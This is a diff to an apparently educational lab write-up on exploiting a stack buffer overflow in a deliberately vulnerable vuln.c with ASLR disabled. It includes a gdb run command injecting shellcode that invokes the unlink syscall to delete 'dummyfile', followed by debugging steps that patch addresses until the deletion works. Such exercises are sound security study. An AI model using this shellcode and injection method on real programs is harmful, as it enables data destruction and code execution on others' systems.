@@ -1,3 +1,9 @@
+# DELETE DUMMYFILE USING INJECTION CODE
+
+**_Stack frame of vuln.c:_**
+
+![image](https://github.com/user-attachments/assets/47fcfd62-f76e-4b55-b7cf-00cfb3148904)
+
 ![image](https://github.com/user-attachments/assets/449c77c3-107f-4ce1-87cc-b20964e8e09c)
 
 **First commands:**
@@ -50,10 +56,34 @@ Change shell and disable ASLR:
 
 ![image](https://github.com/user-attachments/assets/1532d5f1-18e6-46c1-b79e-24a9088dbd27)
 
-![image](https://github.com/user-attachments/assets/56b53d60-5b95-44de-8114-54fc6bc84f66)
+- Set 2 break points at 0x0804843e and 0x0804846b to see the difference when we run the program
 
-![image](https://github.com/user-attachments/assets/a44cf942-e732-40de-91f3-579cfa6edeef)
+- Run the program with the command r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00'+'a'\*32+'\xaa\xaa\xaa\xaa')")
 
-![image](https://github.com/user-attachments/assets/f93d61e9-43c4-45c7-884d-eae68d366493)
+<!-- ![image](https://github.com/user-attachments/assets/56b53d60-5b95-44de-8114-54fc6bc84f66) -->
 
-![image](https://github.com/user-attachments/assets/187766cc-6ecc-487d-9d9a-089521863ee7)
+- Run the program again. Now we see that the transmission is correct.
+
+- We see that at break 2, only the first 3 values ​​are the same as the hexstring we put into the program, everything else is different.
+- `\x0a` là `\n` trong hexstring
+
+=> So we should change the code again.
+
+![image](https://github.com/user-attachments/assets/f58bfe72-33b4-4dc1-9f01-a0671e94ddc1)
+
+- We change address 0xffffd64c to esp address 0xffffd608, and address 0xffffd62b to \x00 and continue the program
+- However, when we check, the dummyfile file is still there.
+
+![image](https://github.com/user-attachments/assets/06c59473-a74b-444f-8e53-4e6f4f75c291)
+
+- Check `file_del`
+
+![image](https://github.com/user-attachments/assets/4174643a-69a5-4181-b4fd-5c810cd11231)
+
+- We see that dummyfile is stored at address 0x0804807a, and the mov instruction $0x804807a, %ebx, so the deletion actually just makes the ebx register no longer point to its address. So we need to reset the dummyfile address in the program to the address of ebx.
+
+![image](https://github.com/user-attachments/assets/aefbd91a-7843-446f-a313-dbdf700e4db4)
+
+- Result :
+
+![image](https://github.com/user-attachments/assets/78850471-ead4-42a9-a31f-8448a73f3690)
